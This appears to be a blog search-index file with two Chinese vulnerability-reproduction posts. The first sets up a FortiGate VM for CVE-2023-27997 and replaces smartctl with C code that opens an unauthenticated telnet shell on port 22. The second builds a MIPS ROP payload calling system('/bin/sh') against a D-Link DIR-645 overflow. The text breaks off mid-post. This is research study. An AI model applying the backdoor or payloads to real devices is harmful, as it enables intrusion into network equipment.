<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2023-27997环境搭建以及堆溢出复现</title>
      <link href="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>这篇文章比较详细的分享了环境搭建以及漏洞原理，具体复现还在进行中，后续完成了会更新的 orz<br>参考了 <a href="https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html">swing师傅博客文章</a>  同时感谢xsh师傅的答疑解惑 orz</p><span id="more"></span><h4 id="配置fortigate-vm"><a href="#配置fortigate-vm" class="headerlink" title="配置fortigate-vm"></a>配置fortigate-vm</h4><p>导入forigate-vm<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709565904931-5e4c6535-ec7b-4ad7-851e-c937be7dd3fa.png"><br>将网络适配器都改为 net，登录账号admin 密码初始为空 登录后自己设置密码，然后配置ip<br>查看网卡配置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show system interface</span><br></pre></td></tr></table></figure><p><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422161940267.png" alt="image-20240422161940267"></p><p>网卡ip配置：</p><p>为了后续方便调试，这里的ip设置为自己另一台ubuntu同段的ip</p><p>注意要设置在vm的dhcp设置范围内</p><p><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422162859960.png" alt="image-20240422162859960"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config system interface</span><br><span class="line">edit port1</span><br><span class="line"><span class="built_in">set</span> mode static</span><br><span class="line"><span class="built_in">set</span> ip 192.168.201.148 255.255.255.0</span><br><span class="line"><span class="built_in">set</span> allowaccess http https ping ssh telnet</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422162013894.png" alt="image-20240422162013894"></p><p>配置网卡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config router static</span><br><span class="line">edit 1</span><br><span class="line"><span class="built_in">set</span> device port1</span><br><span class="line"><span class="built_in">set</span> gateway 192.168.201.2</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>然后就可以在unbuntu中去访问对应网页了<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422162252725.png" alt="image-20240422162252725"></p><h6 id="配置-sslvpn"><a href="#配置-sslvpn" class="headerlink" title="配置 sslvpn"></a>配置 sslvpn</h6><p>因为漏洞出现在sslvpn中</p><p>先添加三个网段 SSLVPN_address | subnet_addres | ubuntu22<br>然后添加一个用户<br>再添加一个用户组，并把之前注册的用户添加进新的用户组<br>修改 vpn 门户，并进入 full-access 修改界面</p><p>VPN —–&gt; SSL-VPN-Portals—-&gt; full-access<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709570853453-cc2d2e82-ded4-44d9-a122-c1f6a1aaa511.png"><br>选择 ok 后，进入 vpn 设置<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709570913759-1848f9ad-ba7d-4836-b82b-a70a51bfc2fb.png"><br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709570944252-60db9c6a-879c-4272-a6ad-7bb9044b7206.png"><br>更改防火墙策略，新建一个防火墙策略<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709571009879-109c4c91-8112-43c3-8a08-c2ea4c938d4a.png"></p><p>然后就可以用创建的用户账号访问4433端口了</p><p>注意：</p><ul><li>fortigate 是低版本的 tls 协议，所以很多浏览器都无法访问 4433 sslvpn 服务端口，最后换成低版本的chrome浏览器，才成功访问，而且需要注意，是 https 协议访问，不能用 http<br>                                                                    ——xshhc师傅<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709571127734-98fa0682-c846-44a6-a8c8-affc05705f02.png"><br>能打开即配置好sslvpn服务了</li></ul><p>这里可以备份一下设置后续也可以用备份文件快速搭建</p><p><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422165642051.png" alt="image-20240422165642051"></p><h4 id="GDB环境配置"><a href="#GDB环境配置" class="headerlink" title="GDB环境配置"></a>GDB环境配置</h4><h6 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h6><p>找到虚拟机文件目录，将fgt的硬盘挂到ubuntu上<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709568910432-66a8ca15-5dca-49f1-9e86-c8fe24768073.png"><br>打开并将里面的rootfs.gz 复制出来解压<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709568928234-a8ea0be6-5c10-488b-9d0d-01dbb7ba823d.png"><br>赋权、解压</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Dekstop/fortios</span><br><span class="line"><span class="built_in">chmod</span> 777 rootfs.gz</span><br><span class="line">gzip -d rootfs.gz</span><br><span class="line">sudo cpio -idmv &lt; ./rootfs</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /bin.tar.xz</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /bin.tar</span><br></pre></td></tr></table></figure><p><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709568945563-6d8e0f71-9fda-409b-b75a-da3dbda30300.png"></p><h6 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h6><p>准备一个busybox提供完成的sh指令，fgt自带的sh缺少很多指令<br><a href="https://blog.csdn.net/baidu_36250852/article/details/120616735">busybox的下载、配置、编译、安装一条龙服务_static linking against glibc, can’t use –gc-secti-CSDN博客</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget  https://busybox.net/downloads/busybox-1.31.0.tar.bz2</span><br><span class="line">tar -xjvf busybox-1.31.0.tar.bz2</span><br><span class="line">sudo apt-get install libncurses5-dev </span><br><span class="line">meke menuconfig</span><br><span class="line"></span><br><span class="line">make -j6</span><br></pre></td></tr></table></figure><p>替换原来的sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> ../busybox ./bin</span><br><span class="line">sudo <span class="built_in">chmod</span> +x ./bin/busybox</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">sudo <span class="built_in">rm</span> -rf sh</span><br><span class="line"><span class="built_in">ln</span> -s /bin/busybox sh</span><br><span class="line"><span class="built_in">mv</span> sh ./bin/sh</span><br></pre></td></tr></table></figure><p>自己重新写个smartctl、将</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/busybox ls&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//执行ls</span></span><br><span class="line">system(<span class="string">&quot;/bin/busybox id&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//执行id</span></span><br><span class="line">system(<span class="string">&quot;/bin/busybox kill all sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//停止所有sshd进程，telnet挂载sh到22端口、此时sh是指busybox</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span>&#123;</span><br><span class="line">shell();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译，替换原来的smartctl</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc smartctl.c -static -o smartctl</span><br><span class="line">sudo <span class="built_in">cp</span> ../smartctl ./bin</span><br><span class="line">sudo <span class="built_in">chmod</span> +x ./bin/smartctl</span><br></pre></td></tr></table></figure><p>下载个gdbserver，也放入&#x2F;bin下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/hugsy/gdb-static</span></span><br><span class="line">sudo <span class="built_in">cp</span> ../gdbserver-7.10.1-x64 ./bin</span><br><span class="line">sudo <span class="built_in">chmod</span> +x ./bin/gdbserver-7.10.1-x64</span><br></pre></td></tr></table></figure><p>&#x2F;bin&#x2F;init 程序 main 函数中首先会有几处校验，如果校验失败就会调用 do_halt 重启系统，把call do_halt的部分都nop掉<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709568999186-c4d907fa-d911-4335-9931-b3d809060b39.png"><br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709569016664-1bfe158e-cf06-4a5f-8efe-648f4b6af807.png"><br>然后替换掉原来的init，再重新打包，替换掉原来的rootfs.gz</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#压缩/bin文件</span></span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/ftar -cf bin.tar bin</span><br><span class="line">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -e bin.tar</span><br><span class="line"><span class="comment">#这里记得把/bin文件移出当前目录</span></span><br><span class="line">sudo find ./ | cpio -H newc -o &gt; ../rootfs.raw</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">sudo <span class="built_in">cat</span> ./rootfs.raw | gzip &gt; rootfs.gz</span><br><span class="line"><span class="comment"># 进入硬盘目录</span></span><br><span class="line">sudo <span class="built_in">rm</span> ./rootfs.gz</span><br><span class="line">sudo <span class="built_in">cp</span> ~/Desktop/rootfs.gz ./</span><br></pre></td></tr></table></figure><h6 id="绕过校验"><a href="#绕过校验" class="headerlink" title="绕过校验"></a>绕过校验</h6><p>在vm目录下的.vmx文件中添加下列信息<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/1709569043541-7a25eb62-aacd-4f65-9fd2-bc911ddafe9f.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64=<span class="string">&quot;TRUE&quot;</span></span><br><span class="line">debugStub.listen.guest64.remote=<span class="string">&quot;TRUE&quot;</span></span><br><span class="line">debugStub.port.guest64=<span class="string">&quot;12345&quot;</span></span><br><span class="line">debugStub.listen.guest32=<span class="string">&quot;TRUE&quot;</span></span><br><span class="line">debugStub.listen.guest32.remote=<span class="string">&quot;TRUE&quot;</span></span><br><span class="line">debugStub.port.guest32=<span class="string">&quot;12346&quot;</span></span><br></pre></td></tr></table></figure><h6 id="试运行gdb"><a href="#试运行gdb" class="headerlink" title="试运行gdb"></a>试运行gdb</h6><p>先在ubuntu准备好gdb，然后开启foritage，在如下界面出来1~2秒后，target链接<br><code>target remote 192.168.201.1:12345</code><br>然后定位到fgt_veritf检测这里，手动修改返回值为0<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422185300162.png" alt="image-20240422185300162"><br>然后就可以正常执行到init、然后就可以在fortigate中登录<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422185511793.png" alt="image-20240422185511793"><br>运行提前准备好的smartctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/busybox ls&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/busybox id&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/busybox kill all sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span>&#123;</span><br><span class="line">shell();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diagnose hardware smartctl</span><br></pre></td></tr></table></figure><p>会显示执行的ls、id，证明smartctl执行成功、将sh挂在了22端口<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422185542424.png" alt="image-20240422185542424"><br>然后就可以通过kali去连（ubuntu会将未激活的fgt认定为危险、不过我用ubuntu还是连上了）<br>启动gdbserver，并将其附加到 <code>sslvpnd</code> 进程上</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给gdbserver运行权限</span></span><br><span class="line">/bin/busybox  <span class="built_in">chmod</span> +x ./bin/gdbserver-7.10.1-x64 </span><br><span class="line"></span><br><span class="line">/bin/busybox  <span class="built_in">kill</span> -9 $(/bin/busybox pidof telnetd) &amp;&amp; ./bin/gdbserver-7.10.1-x64 0.0.0.0:23 --attach $(/bin/busybox pidof sslvpnd)</span><br><span class="line"><span class="comment"># killall telnetd &amp;&amp; gdbserver :23 --attach sslvpn_pid</span></span><br></pre></td></tr></table></figure><p>可能会报错、多试几次<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422190032621.png" alt="image-20240422190032621"><br>然后就可以gdb连23端口正常调试了<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240422190014305.png" alt="image-20240422190014305"></p><h4 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h4><p>当我们向 fortigate sslvpn 发送一个 enc 的 HTTP 参数的时候, 会进到一个parse_enc_data (自命名) 函数中，可以通过图中这串字符串快速定位<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240423142534659.png" alt="image-20240423142534659"><br>进入改函数之后会对enc数据长度、奇偶性判断，需要长度大于11且为偶数，然后会进行md5初始化以及je_malloc申请size&#x2F;2+1大小，来存放数据<br>数据存放形式：<code>0x61616161---》/x61/x61/x61/x61</code><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240423144302702.png" alt="image-20240423144302702"><br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240423161207659.png" alt="image-20240423161207659"><br>注意，这里会在处理完实际enc数据后加 \x00截断<br>数据处理完就进入漏洞点这里了，这里网上文章的说法都迷迷糊糊的，我的理解是这里判断条件是 实际传入的enc数据长度 与enc参数中定义的size比较，而je_malloc申请的大小实际是 实际长度&#x2F;2 + 1<img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240423150133591.png" alt="image-20240423150133591"><br>并且后续解密时循环次数使用的是定义长度，所以当我们实际长度 &gt; 定义长度 &gt; 实际长度&#x2F;2 + 1时，我们就可以实现堆溢出<br>不过这里堆溢出的数据会是md5异或后的数据，要控制为我们想要的值还是有点困难的<img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/image-20240423161646536.png" alt="image-20240423161646536"><br>这里原作者提供了一个非常巧妙的技巧，利用\x00以及异或的性质，向将目标位置用\x00覆盖掉，第二次找到特定seed来将改位置的值覆盖为想到的值，又因为 x ^ y &#x3D; z ; z ^ y &#x3D; x ，我们可以将其他数据还原回来，也就是可以实现不改变其他数据的情况下改变一个字节<br><img src="/2024/04/22/CVE-2023-27997%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" alt="img"></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>iot设备堆溢出，可以溢出覆盖 SSL 结构中的 <code>handshake_func</code> 指针、该指针类似于malloc_hook<br>后续目前还在进行中，待续……</p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dlink-DIR645溢出漏洞复现</title>
      <link href="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="DIR-645溢出漏洞复现"><a href="#DIR-645溢出漏洞复现" class="headerlink" title="DIR-645溢出漏洞复现"></a>DIR-645溢出漏洞复现</h3><p>和DIR-815溢出漏洞非常相似，相当于再巩固一遍吧。<br>authentication.cgi中post请求时CONTENT_LENGTH没有限制，后续作为read参数造成溢出</p><span id="more"></span><h6 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h6><p>根据漏洞信息、漏洞出现在authentication.cgi，也是指向.&#x2F;htdocs&#x2F;cgibin的符号链接<br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710173598827-7ccf893f-3aff-4421-99b5-012452f62649.png"><br>当为post请求时，读取CONTENT_LENGTH和CONTENT_TYPE的值，若不为空，read( stdin , v71 , CONTENT_LENGTH ) ，这里stdin即为POST中的body数据，而v71也是固定长度的，所以这里存在溢出，然后观察一下怎么完整走完改函数，就可以控制程序流了<br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710173802769-e5fc0ef0-ba8b-486c-9b34-3fd0ebf12f15.png"><br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710174120193-8dc07f04-f167-4968-bb0c-dd8d8c65a256.png"><br>这里利用for循环来分别定位数据中的id&#x3D;、password&#x3D;，并取走对应内容计算长度<br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710174370712-a9a8f862-bdbe-4454-baf2-318d5da0ae0c.png"><br>然后依据i来将数据strncpy到v67中，而这里strncpy的长度参数居然用的源数据长度，所以这里也可以造成溢出，这里如果使id数据过长会导致后续strncpy失败，所以id数据尽量短写，利用password来溢出<br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710174431379-7e46eb11-de82-45e7-9311-9135c56890eb.png"><br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710174659030-028a2c51-e15f-4813-809b-95b65cdebfaf.png"><br>后续就没什么影响的内容了，直接执行就好</p><h6 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h6><p>函数退出时的操作：<br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710175144520-7e60c0dc-b078-4bf7-824a-7a32ab747874.png"><br>尝试一下溢出测试偏移<br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710175102662-c760473b-b876-4dff-9409-ba37a9ca2d7c.png"><br>之后和DIR-815溢出漏洞就一样了，确定libc_base，利用mipsrop找到合适的gadget<br>注 addiu $s5,$sp,0x10是将$sp+0x10的值存到 $s5<br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710175485874-12494353-d692-4138-8daa-557fc8f87930.png"><br><img src="/2024/03/11/Dlink-DIR645%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1710175809321-89d93e01-5b9d-45b2-8029-033484eddad2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pad = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x408</span>-<span class="number">0x8</span>-<span class="number">0xa</span>)</span><br><span class="line">pad += p32(system_addr-<span class="number">1</span>)<span class="comment"># s0</span></span><br><span class="line">pad +=  <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> <span class="comment"># s1</span></span><br><span class="line">pad += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment"># s2</span></span><br><span class="line">pad += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment"># s3 </span></span><br><span class="line">pad += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment"># s4</span></span><br><span class="line">pad += p32(libuc_base + gadget2)<span class="comment"># s5</span></span><br><span class="line">pad += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment"># s6</span></span><br><span class="line">pad += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment"># s7</span></span><br><span class="line">pad += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment"># fp</span></span><br><span class="line">pad += p32(libuc_base + gadget1)<span class="comment"># ra</span></span><br><span class="line">pad += <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">pad += <span class="string">b&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h6><p>确定好偏移，就可以控制程序流了<br><img 